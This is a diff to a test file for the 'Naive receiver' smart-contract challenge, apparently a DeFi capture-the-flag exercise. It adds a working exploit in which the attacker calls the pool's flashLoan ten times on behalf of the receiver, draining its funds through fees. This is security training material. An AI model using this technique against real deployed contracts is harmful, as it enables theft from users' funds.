@@ -31,6 +31,11 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        const MAX_INT = 2**256 - 1
+        const poolWithSigner = this.pool.connect(attacker)
+        for (let i = 0; i < 10; i++) {
+            await poolWithSigner.flashLoan(this.receiver.address, ETHER_IN_POOL)
+        }
     });
 
     after(async function () {
